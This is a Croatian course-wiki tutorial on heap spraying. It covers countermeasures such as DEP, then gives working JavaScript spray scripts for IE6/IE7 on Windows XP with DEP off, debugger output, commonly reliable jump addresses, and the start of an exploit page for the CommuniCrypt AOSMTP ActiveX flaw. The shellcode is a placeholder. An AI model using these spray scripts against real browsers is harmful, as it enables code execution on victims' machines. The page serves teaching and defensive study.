+<p>Ova vrsta protumjere se na istoj pretpostavci kao i Nozzle, da napad može biti proveden od strane HTML stranice u koju je uključen Javascript, te od pretopstavke da su Javascript stringovi jedini način za alokaciju malicioznih podataka na hrpu. Tako se provjeravaju i nadziru svi podaci koji su u hrpu alocirani od strane Javascripta. Svi testovi moraju biti sprovedeni prije nego slabost može biti iskorištena za promjenu kontrole toka aplikacije. Ukoliko sustav utvrdi prisutnost malicioznog koda, zaustavlja se izvršavanje skripte.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mapiknjac&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mapiknjac (stranica ne postoji)">mapiknjac</a> 11:33, 19. siječnja 2013. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Data_Execution_Prevention_.28Prevencija_izvr.C5.A1avanja.29">Data Execution Prevention (Prevencija izvršavanja)</span></h3>
+<p>Prevencija izvršavanja podataka, eng. "Data Execution Prevention", ili skraćeno DEP je protumjera koja sšrečava izvršavanje stranica koda u memoriji. Može biti implementirana i pomoću hardwera i pomoću softwera. Ukoliko je DEP uključen, stranice koda će biti označene da kao da ih nije moguće izvršiti te će to spriječiti napadača da izvrši svoj ubačeni kod na hrpi. Ukoliko aplikacija pokuša izvršiti ubačeni kod koji je označen od strane DEP-a, podići će se iznimka prekršaja pristupa (access violation exception). To će dovesti do rušenja aplikacije, ukoliko se njome pravilno ne rukuje.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mapiknjac&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mapiknjac (stranica ne postoji)">mapiknjac</a> 16:20, 20. siječnja 2013. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Rastavljanje_i_replikacija_informacija">Rastavljanje i replikacija informacija</span></h3>
+<p>Takva vrsta protumjera replicira informacije o kotroli toka ili rastavlja te informacije od običnih podataka. Takva vrsta protumjere otežava napdaču da prepiše informacije o kotroli toka koristeći preljev. Protumjera jednostavno kopira povratne adrese iz stoga u pričuvni stog i uspoređuje i po potrebi zamjenjuje adrese na stogu prije vraćanja iz funckija.
+Međutim, takve protumjere se mogu lako zaobići korištenjem prepisivanja indirektnih pokazivača tako da napadač prepiše prepiše drugu lokaciju u memoriji umjesto povratne adrese korištenjem pokazivača na stogu.
+</p><p>Neke naprednije metode pokušavaju rastaviti sve podatke o kontroli toka od običnih podataka, te time onemogućavaju napadača od korištenja preljeva za prepisivanje podataka. One vrlo učikovito štite od preljeva međuspremnika koi pokušavaju prepisati informacije o kontroli toka, ali ne štite od napada u kojima napadač ima kontrolu nad integerom koji se koristi kao pomak kod pokazivača, a niti kod napada koji ne koriste kontrolu toka.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mapiknjac&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mapiknjac (stranica ne postoji)">mapiknjac</a> 11:56, 19. siječnja 2013. (CET)
+</p>
+<h2> <span class="mw-headline" id="Malo_prakti.C4.8Dni_dio"> Malo praktični dio  </span></h2>
+<h3> <span class="mw-headline" id="Radna_okolina_-_OS.2C_software.2C_...">Radna okolina - OS, software, ...</span></h3>
+<p>Praktični dio je rađen na Fedori 17 x86_64,i u VirtualBox-u pokrenut WinXP SP3 x86. 
+Koncepti heap spraying-a se testiraju na XP SP3 i IE6, IE7 browserima.
+<a href="http://en.wikipedia.org/wiki/Data_Execution_Prevention" class="external text" rel="nofollow">DEP</a> je isključen.
+Sljedeće trebamo <a href="https://www.immunityinc.com/products-immdbg.shtml" class="external text" rel="nofollow">Immunity Debugger</a>, <a href="http://redmine.corelan.be/projects/mona" class="external text" rel="nofollow">mona.py</a>, <a href="http://msdn.microsoft.com/en-us/windows/hardware/gg463009" class="external text" rel="nofollow">windbg</a> i <a href="http://technet.microsoft.com/en-us/sysinternals/dd535533" class="external text" rel="nofollow">wmmap ( dostupan i u Live.Sysinternals.com)</a>. Nisu svi potrebni ali svaki nešto pokazuje pa ih je dobro isprobati.
+Potrebna je još mala konfiguracija nekih programa i spremni smo.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Sacalopek&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Sacalopek (stranica ne postoji)">sacalopek</a> 15:44, 20. siječnja 2013. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Alokacija_memorije">Alokacija memorije</span></h3>
+<p>Internet preglednici puno olakšavaju alokaciju jer imaju podržan javascript, tako da je očiti način alociranja memorije:
+</p>
+<pre>
+&lt;html&gt;
+    &lt;body&gt;
+    &lt;script language='javascript'&gt;
+        var myvar = &quot;CORELAN!&quot;;
+        alert(&quot;allocation done&quot;);
+    &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</pre>
+<p>Pokrenemo Immunity Debugger te se zakačimo za IE6 ( iexplorer.exe ) te koristeći mona-u možemo pronaći određeni string sa:
+</p>
+<pre>    &#160;!mona find -s &quot;CORELAN!&quot; -unicode -x * </pre>
+<p>Ili u WinDBG-u:
+</p>
+<pre>     s -u 0x00000000 L?0x7fffffff &quot;CORELAN!&quot; </pre>
+<p>To onda izgleda kao na slici ispod:
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:362px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Find_string.png" class="image"><img alt="Izgled memorije." src="../images/thumb/b/b8/Find_string.png/360px-Find_string.png" width="360" height="105" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Find_string.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Izgled memorije</div></div></div></div>
+<p>Znamo da možemo zauzeti memoriju koristeći varijablu tipa string u javascript-u, u ovom primjeru iznad zauzeto je malo memorije. Shellcode će biti dosta veći ali opet relativno mali prema ukupno dostupnoj virtualnoj memoriji hrpe. Moguće je koristiti više varijabli i da svaka sadrži shellcode i onda pokušati skočiti na početak bloka u memoriji, ali trebali bi biti vrlo precizni, tj. znati adresu početka bloka.
+Zato se to radi na malo drugačiji način. 
+Alociraju se veći dijelovi memorije koji se sastoje od dva dijela:
+</p>
+<ol><li><a href="http://en.wikipedia.org/wiki/NOP" class="external text" rel="nofollow">NOPs</a>
+</li><li>shellcode ( na kraju )
+</li></ol>
+<p>Zbog fragmentacije prvih nekoliko alokacija bude rezultiralo nepouzdanim adresama jer taj popunjeni prostor nije deterministički i ovisi o programu ( IE u ovom primjeru ), instaliranim dodacima i sl., ali kako se nastavlja alocirati dio memorije doći će se do dijela koji će uvijek biti ispunjen s NOP operacijama. Kad je taj dio siguran, jedino što preostaje je skočiti na neku adresu koja sadrži NOP, oni će se redom izvršavati ( ne rade ništa ) i na kraju doći do našega shellcode-a te će se i on izvršiti.
+To se vidi na ove dvije slike ispod.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:362px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Heap_alloc.png" class="image"><img alt="Heap alloc.png" src="../images/thumb/7/7d/Heap_alloc.png/360px-Heap_alloc.png" width="360" height="319" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Heap_alloc.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div></div></div></div></div>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:362px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Bef_aft.png" class="image"><img alt="Izgled hrpe." src="../images/thumb/2/22/Bef_aft.png/360px-Bef_aft.png" width="360" height="258" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Bef_aft.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Izgled hrpe</div></div></div></div>
+<p>Još jedan problem je taj kad se alocira string, on se pretvara u <a href="http://msdn.microsoft.com/en-us/library/1b2d7d2c-47af-4389-a6b6-b01b7e915228(VS.85)" class="external text" rel="nofollow">BSTR objekt</a>.
+Pitanje je da li je tražena memorija u hrpi iste veličine kao i BSTR objekt ili je veća? Ako je veća čime se puni ostatak?
+Ako svaki dio alocirane memorije sadrži "garbage", a alocira se puno dijelova, između svaka ta dijela se nalaze nepredvidivi podaci i to je problem jer se može dogoditi da umjesto na NOP operacije skočimo na taj dio.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:362px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Heap_chunk.png" class="image"><img alt="Heap chunk.png" src="../images/thumb/3/34/Heap_chunk.png/360px-Heap_chunk.png" width="360" height="47" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Heap_chunk.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div></div></div></div></div>
+<p>To se riješi na način da se odabere pravila veličina BSTR objekta tako da alocirani dio memorije u hrpi bude po veličini što bliže BSTR objektu.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Sacalopek&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Sacalopek (stranica ne postoji)">sacalopek</a> 16:19, 20. siječnja 2013. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Osnovna_skripta">Osnovna skripta</span></h3>
+<p>Koristeći puno zasebnih varijabli nebi nikamo vodilo tako da se koristi polje. Polje = nops + shellcode.
+Ideja je da polje bude dovoljno veliko da u memoriji oni budu jedan do drugoga ili jako blizu. Ovdje je za primjer na početak svakog bloka stavljen string “CORELAN!” a ostatak popunjen sa NOP kodom.
+Naravno kad se radi nešto ozbiljnije se sve puni sa NOPs a kraj sa shellcode-om.
+</p><p>Kod se nalazi ispod:
+</p>
+<code><pre>
+&lt;html&gt;
+   &lt;script &gt;
+     tag = unescape('%u4F43%u4552'); // CORE
+     tag += unescape('%u414C%u214E'); // LAN!
+
+     chunk = '';
+     chunksize = 0x1000;
+     nr_of_chunks = 200;
+
+     for ( counter = 0; counter &lt; chunksize; counter++) {
+	chunk += unescape('%u9090%u9090');
+     }
+
+     document.write(&quot;size of NOPS at this point&#160;: &quot; + chunk.length.toString() + &quot;&lt;br&gt;&quot;);
+     chunk = chunk.substring(0,chunksize - tag.length);
+     document.write(&quot;size of NOPS after substring&#160;: &quot; + chunk.length.toString() + &quot;&lt;br&gt;&quot;);
+
+     testarray = new Array();
+     for ( counter = 0; counter &lt; nr_of_chunks; counter++) {
+	testarray[counter] = tag + chunk;
+	document.write(&quot;Allocated &quot; + (tag.length+chunk.length).toString() + &quot; bytes &lt;br&gt;&quot;);
+      }
+     alert(&quot;Spray done&quot;)
+  &lt;/script&gt;
+&lt;/html&gt;
+</pre></code>
+<p>Pokrenemo IE6, otvorimo stanicu koja sadrži skriptu i to onda izgleda ovako:
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:362px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Pokrenuto1.png" class="image"><img alt="Primjer 1." src="../images/thumb/4/4f/Pokrenuto1.png/360px-Pokrenuto1.png" width="360" height="253" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Pokrenuto1.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Primjer pokrenute skripte iznad.</div></div></div></div>
+<p>Sa alatom VMMap možemo vidjeti što se događa u pretraživaču.
+Stanje memorije prije pokretanja skripte:
+</p>
+<div class="thumb tleft"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wmmap1.png" class="image"><img alt="" src="../images/thumb/f/fc/Wmmap1.png/200px-Wmmap1.png" width="200" height="119" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wmmap1.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><div align="center">Primjer pokrenute skripte iznad. WMMap prije spray-a </div></div></div></div>
+<div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wmmap11.png" class="image"><img alt="" src="../images/thumb/c/c0/Wmmap11.png/200px-Wmmap11.png" width="200" height="133" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wmmap11.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><div align="center"> Primjer pokrenute skripte iznad. WMMap prije spray-a </div></div></div></div>
+<p><br />
+I stanje poslije otvaranja html stranice sa skriptom:
+</p>
+<div class="thumb tleft"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wmmap2.png" class="image"><img alt="" src="../images/thumb/1/11/Wmmap2.png/200px-Wmmap2.png" width="200" height="118" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wmmap2.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><div align="center"> Primjer pokrenute skripte iznad. WMMap nakon spray-a </div></div></div></div>
+<div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wmmap22.png" class="image"><img alt="" src="../images/thumb/b/bc/Wmmap22.png/200px-Wmmap22.png" width="200" height="151" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Wmmap22.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><div align="center"> Primjer pokrenute skripte iznad. WMMap nakon spray-a </div></div></div></div>
+<p>Zadnja dva žuta bloka je alocirala ta skripta. Ovdje se može vidjeti problem s fragmentacijom, žuti dio na dnu je alocirala naša skripta. Sve što bi došlo poslije njega je već sigurnije da se bude nalazilo tu nego neki blok prije.
+</p><p>Ako pogledamo pomoću <b>Immunity Debugger</b> alata:
+</p>
+<code><pre> &#160;!mona find -s &quot;CORELAN!&quot; </pre></code>
+<p>Pošto blok započinje sa "CORELAN!" tražimo njega, nakon toga prikažemo stanje na nekoj od adresa na kojima je pronađen:
+</p>
+<code><pre>  d 0x0021EEB4 </pre></code>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:202px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Stanjemem1.png" class="image"><img alt="" src="../images/thumb/2/2f/Stanjemem1.png/200px-Stanjemem1.png" width="200" height="183" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Stanjemem1.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><div align="center"> Stanje u memoriji nakon izvršene skripte. </div></div></div></div></div>
+<p>Vidi se sa slike da je prije i poslije stringa memorija puna s 90 ili NOP-ima. Ali se vidi i dio smeća između dva BSTR objekta.
+Bitno je da "smeće" bude što manje ili najbolje da ga uopće nema.
+</p><p>Isto se može vidjeti i pomoću WinDBG alata, ali on ima još neke dodatne opcije pa tako možemo vidjeti statistiku hrpe&#160;:
+</p>
+<code><pre>
+0:007&gt;&#160;!heap -stat -h 00150000
+ heap @ 00150000
+group-by: TOTSIZE max-display: 20
+    size     #blocks     total     (&#160;%) (percent of total busy bytes)
+    2010 c0 - 180c00  (67.90)
+    8000 3 - 18000  (4.24)
+    4000 4 - 10000  (2.82)
+    3ff0 3 - bfd0  (2.12)
+    4010 2 - 8020  (1.41)
+    57f0 1 - 57f0  (0.97)
+    52ac 1 - 52ac  (0.91)
+    614 c - 48f0  (0.80)
+    20 224 - 4480  (0.76)
+    3980 1 - 3980  (0.63)
+    2a4 11 - 2ce4  (0.50)
+    580 8 - 2c00  (0.49)
+    1fe6 1 - 1fe6  (0.35)
+    108 18 - 18c0  (0.27)
+    800 3 - 1800  (0.26)
+    d8 1b - 16c8  (0.25)
+    16c0 1 - 16c0  (0.25)
+    1530 1 - 1530  (0.23)
+    e0 17 - 1420  (0.22)
+    141c 1 - 141c  (0.22)
+</pre></code>
+<p>Vide se veličine i broj blokova, ali još se ne zna koji je naš. Zato se uzme jedna adresa na kojoj je string "CORELAN!":
+</p>
+<code><pre>
+0:007&gt;&#160;!heap -p -a 0x0235a2c4
+    address 0235a2c4 found in
+    _HEAP @ 150000
+      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
+        0235a2b8 0403 0000  [01]   0235a2c0    02010 - (busy)
+</pre></code>
+<p>Ako pogledamo UserSize, to je veličina rezervirana za naš heap u memoriji. BSTR objekt pokazuje da je alocirano duplo više nego što smo naveli u skripti, ali to je duljina vraćena iz unescape funkcije. Alocirano je još i nešto više od toga pa možemo pokušati manipulirati time tako da mijenjamo veličinu BSTR objekta. Želimo postići da te dvoje bude isto ili barem jako blizu.
+</p><p>Postavimo u skripti prije da je <code>chunksize = 0x4000</code> i probamo opet:
+</p>
+<code><pre>
+0:006&gt;&#160;!heap -stat -h 00150000
+ heap @ 00150000
+group-by: TOTSIZE max-display: 20
+    size     #blocks     total     (&#160;%) (percent of total busy bytes)
+    8010 c8 - 640c80  (89.23)
+    8000 6 - 30000  (2.68)
+    7ff0 3 - 17fd0  (1.34)
+    57f0 1 - 57f0  (0.31)
+    52ac 1 - 52ac  (0.29)
+    614 c - 48f0  (0.25)
+    20 222 - 4440  (0.24)
+    3980 1 - 3980  (0.20)
+    2a4 11 - 2ce4  (0.16)
+    580 8 - 2c00  (0.15)
+    1ff6 1 - 1ff6  (0.11)
+    800 3 - 1800  (0.08)
+    d8 1b - 16c8  (0.08)
+    16c0 1 - 16c0  (0.08)
+    108 16 - 16b0  (0.08)
+    1530 1 - 1530  (0.07)
+    e0 17 - 1420  (0.07)
+    141c 1 - 141c  (0.07)
+    504 4 - 1410  (0.07)
+    1378 1 - 1378  (0.07)
+</pre></code>
+<p>U ovom slučaju, 89.23&#160;% alociranih djelova hrpe ima istu veličinu ( 8010 bajti ).
+Promjenimo veličinu još jednom, <code>chunksize  = 0×10000</code>:
+</p>
+<code><pre>
+0:006&gt;&#160;!heap -stat -h 00150000
+ heap @ 00150000
+group-by: TOTSIZE max-display: 20
+    size     #blocks     total     (&#160;%) (percent of total busy bytes)
+    20010 c8 - 1900c80  (96.60)
+    8000 6 - 30000  (0.72)
+    20000 1 - 20000  (0.48)
+    7ff0 3 - 17fd0  (0.36)
+    57f0 1 - 57f0  (0.08)
+    52ac 1 - 52ac  (0.08)
+    614 c - 48f0  (0.07)
+    20 221 - 4420  (0.06)
+    3980 1 - 3980  (0.05)
+    2a4 11 - 2ce4  (0.04)
+    580 8 - 2c00  (0.04)
+    1ff8 1 - 1ff8  (0.03)
+    800 3 - 1800  (0.02)
+    d8 1b - 16c8  (0.02)
+    16c0 1 - 16c0  (0.02)
+    108 16 - 16b0  (0.02)
+    1530 1 - 1530  (0.02)
+    141c 1 - 141c  (0.02)
+    504 4 - 1410  (0.02)
+    1378 1 - 1378  (0.02)
+</pre></code>
+<p>Vidimo da je sada 96.60% blokova iste veličine. Primjer za jednu adresu se nalazi na slici ispod:
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:302px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Heap_mem_example.png" class="image"><img alt="" src="../images/thumb/e/e4/Heap_mem_example.png/300px-Heap_mem_example.png" width="300" height="71" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Heap_mem_example.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><div align="center"> WinDBG primjer memorije. </div></div></div></div></div>
+<p><br />
+Testiranje istoga u IE7:
+</p>
+<code><pre>
+0:009&gt; s -a 0x00000000 L?0x7fffffff &quot;CORELAN&quot;
+02a7dc4c  43 4f 52 45 4c 41 4e 21-90 90 90 90 90 90 90 90  CORELAN!........
+02a9ec4c  43 4f 52 45 4c 41 4e 21-90 90 90 90 90 90 90 90  CORELAN!........
+02abfc4c  43 4f 52 45 4c 41 4e 21-90 90 90 90 90 90 90 90  CORELAN!........
+02ae0c4c  43 4f 52 45 4c 41 4e 21-90 90 90 90 90 90 90 90  CORELAN!........
+02b01c4c  43 4f 52 45 4c 41 4e 21-90 90 90 90 90 90 90 90  CORELAN!........
+02b22c4c  43 4f 52 45 4c 41 4e 21-90 90 90 90 90 90 90 90  CORELAN!........
+</pre></code>
+<code><pre>
+0:009&gt;&#160;!heap -stat -h 00150000
+ heap @ 00150000
+group-by: TOTSIZE max-display: 20
+    size     #blocks     total     (&#160;%) (percent of total busy bytes)
+    20fc1 c9 - 19e5e89  (89.97)
+    1fff8 5 - 9ffd8  (2.17)
+    3fff8 2 - 7fff0  (1.74)
+    7ff8 b - 57fa8  (1.19)
+    fff8 5 - 4ffd8  (1.09)
+    1ff8 21 - 41ef8  (0.89)
+    3ff8 9 - 23fb8  (0.49)
+    8fc1 4 - 23f04  (0.49)
+    7ff0 3 - 17fd0  (0.33)
+    ff8 c - bfa0  (0.16)
+    7f8 17 - b748  (0.16)
+    7db4 1 - 7db4  (0.11)
+    614 13 - 737c  (0.10)
+    57f0 1 - 57f0  (0.07)
+    52ac 1 - 52ac  (0.07)
+    5e4 b - 40cc  (0.05)
+    20 200 - 4000  (0.05)
+    3980 1 - 3980  (0.05)
+    3f8 e - 3790  (0.05)
+    580 8 - 2c00  (0.04)
+</pre></code>
+<code><pre>
+0:009&gt;&#160;!heap -p -a 045b584c
+    address 045b584c found in
+    _HEAP @ 150000
+      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
+        045b5840 4200 0000  [01]   045b5848    20fc1 - (busy)
+</pre></code>
+<p>UserSize je veći u IE7 nego u IE6 pa će u rupe između dva dijela biti veće, ali je i cijeli blok veći pa to neće biti velik problem.
+</p><p>Ono što smo do sada probali napraviti je smanjiti prostor između dva bloka tako da kad budemo "skakali" na neku adresu u hrpi smanjimo rizik da "padnemo" između dva bloka. Što je manji prostor između manji je rizik. Što više prostora popunimo sa NOP-ima, te nađemo adresu koja uvijek ili skoro uvijek sadrži NOP-se, "skakanje" će biti puno pouzdanije.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Sacalopek&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Sacalopek (stranica ne postoji)">sacalopek</a> 17:42, 20. siječnja 2013. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id=".C4.8Cesto_kori.C5.A1tena_skripta">Često korištena skripta</span></h3>
+<code><pre>
+&lt;html&gt;
+   &lt;script &gt;
+     var shellcode = unescape('%u4141%u4141');
+     var bigblock = unescape('%u9090%u9090');
+     var headersize = 20;
+     var slackspace = headersize + shellcode.length;
+     while (bigblock.length &lt; slackspace) bigblock += bigblock;
+     var fillblock = bigblock.substring(0,slackspace);
+     var block = bigblock.substring(0,bigblock.length - slackspace);
+     while (block.length + slackspace &lt; 0x40000) block = block + block + fillblock;
+     var memory = new Array();
+     for (i = 0; i &lt; 500; i++){ memory[i] = block + shellcode }
+   &lt;/script&gt;
+&lt;/html&gt;
+</pre></code>
+<p>Skripta alocira veće blokove i radi to 500 puta.
+Pokrenemo na IE7 i vidimo:
+</p>
+<code><pre>
+0:009&gt;&#160;!heap -stat -h 00150000
+ heap @ 00150000
+group-by: TOTSIZE max-display: 20
+    size     #blocks     total     (&#160;%) (percent of total busy bytes)
+    7ffe0 1f5 - fa7c160  (99.01)
+    3fff8 2 - 7fff0  (0.20)
+    1fff8 4 - 7ffe0  (0.20)
+    fff8 5 - 4ffd8  (0.12)
+    7ff8 9 - 47fb8  (0.11)
+    1ff8 1b - 35f28  (0.08)
+    3ff8 a - 27fb0  (0.06)
+    ff8 b - afa8  (0.02)
+    8fc1 1 - 8fc1  (0.01)
+    7ff0 1 - 7ff0  (0.01)
+    7fe0 1 - 7fe0  (0.01)
+    7db4 1 - 7db4  (0.01)
+    614 13 - 737c  (0.01)
+    7f8 e - 6f90  (0.01)
+    57f0 1 - 57f0  (0.01)
+    52ac 1 - 52ac  (0.01)
+    5e4 b - 40cc  (0.01)
+    20 200 - 4000  (0.01)
+    3980 1 - 3980  (0.01)
+    580 8 - 2c00  (0.00)
+</pre></code>
+<code><pre>
+0:009&gt;&#160;!heap -p -a 145e0018
+    address 145e0018 found in
+    _HEAP @ 150000
+      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
+        145e0018 fffc 0000  [0b]   145e0020    7ffe0 - (busy VirtualAlloc)
+</pre></code>
+<code><pre>
+0:009&gt; d 145e0018+7ffe0-40
+1465ffb8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
+1465ffc8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
+1465ffd8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
+1465ffe8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
+1465fff8  41 41 41 41 00 00 00 00-00 00 00 00 00 00 00 00  AAAA............
+14660008  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+14660018  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+14660028  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+</pre></code>
+<p>I na IE6 i IE7 se skripta ponaša jednako. Više adrese su uvijek jednake.
+UserSize je uvijek isti.
+Ostatak je uvijek popunjen sa “...90 90 90...” tj. sa  NOP-ima.
+</p><p>Sve ovo nas vodi na sljedeće pitanje, koja adresa je pouzdana i predvidljiva da je koristimo za “skakanje”&#160;?
+</p><p>Adrese koje se obično provjere su:
+</p>
+<ul><li> 0×06060606
+</li><li> 0×07070707
+</li><li> 0×08080808
+</li><li> 0×0909090
+</li><li> 0x0a0a0a0a
+</li><li> itd
+</li></ul>
+<p>U većini slučajeva ako ne i svima, 0×06060606 je dobra adresa ( pokazuje na NOP-se ).
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:302px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Druge_adrese.png" class="image"><img alt="" src="../images/thumb/1/1c/Druge_adrese.png/300px-Druge_adrese.png" width="300" height="121" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Druge_adrese.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><div align="center"> Prikaz više adresa koje pokazuju na NOP. </div></div></div></div></div>
+<p>Naravno može se koristiti bilo koja adresa, osim ovih napisanih, ako su dobre. Dodatno, pretraživač ili drugi program na kojem pokušavamo ovo može imati instalirane razne dodatke pa se oblik memorije mijenja što dovodi do toga da memorija bude više punija te više fragmentirana pa moramo uzimati više adrese.
+Naprimjer možemo uzeti i 0x0c0c0c0c koja je puno viša nego 0×06060606, ali se treba uzeti u obzir da je onda potrebno više iteracija procesora, više alokacija memorije što može usporiti rad pretraživača na neko vrijeme, a to je možda i nepotrebno kao u primjerima ovdje.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Sacalopek&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Sacalopek (stranica ne postoji)">sacalopek</a> 17:54, 20. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="Exploit">Exploit</span></h3>
+<p>U svibnju 2010, je pronađen propust u CommuniCrypt Mail programu.
+</p>
+<pre>
+&quot;The proof of concept exploit indicates that we can overwrite a SEH record by using an overly long argument to the AOSMTP.Mail AddAttachments
+ method. We hit the record after 284 characters. Based on what you can see in the poc, apparently there is enough space on the stack to host
+ the payload, and the application contains a non-safeseh module, so we could use a pointer to pop/pop/ret to jump to the payload.&quot;
+
+&quot;According to the fuzz report, we can control an entry in the SEH Chain, and we might have control over a saved return pointer as well, so
+ we'll have 3 possible scenario’s to exploit this:
+ * Use the saved return pointer to jump to our payload
+ * Use an invalid pointer in the saved return pointer location to trigger an exception and take advantage of the overwritten SEH record to
+ return to the payload
+ * Don't care about the saved return pointer (value may be valid or not, doesn't matter), use the SEH record instead, and see if there is
+ another way to trigger the exception (perhaps by increasing the buffer size and see if you can try to write past the end of the 
+current thread stack.&quot;
+</pre>
+<p><br />
+</p>
+<code><pre>
+&lt;html&gt;
+   &lt;!-- Load the AOSMTP Mail Object --&gt;
+   &lt;object classid='clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82' id='target' &gt;&lt;/object&gt;
+   &lt;script &gt;
+      var shellcode = unescape('%u\4141%u\4141');
+      var bigblock = unescape('%u\9090%u\9090');
+      var headersize = 20;
+      var slackspace = headersize + shellcode.length;
+      while (bigblock.length &lt; slackspace) bigblock += bigblock;
+      var fillblock = bigblock.substring(0,slackspace);
+      var block = bigblock.substring(0,bigblock.length - slackspace);
+      while (block.length + slackspace &lt; 0x40000) block = block + block + fillblock;
+      var memory = new Array();
+      for (i = 0; i &lt; 500; i++){ memory[i] = block + shellcode }
+   &lt;/script&gt;
+&lt;/html&gt;
+</pre></code>
+<p>Pokrenemo ovu skriptu i provjerimo na što pokazuje adresa 0x06060606 te ako je AOSMTP.dll učitam u proces. Na slici ispod se vidi da je sve oke:
+</p>
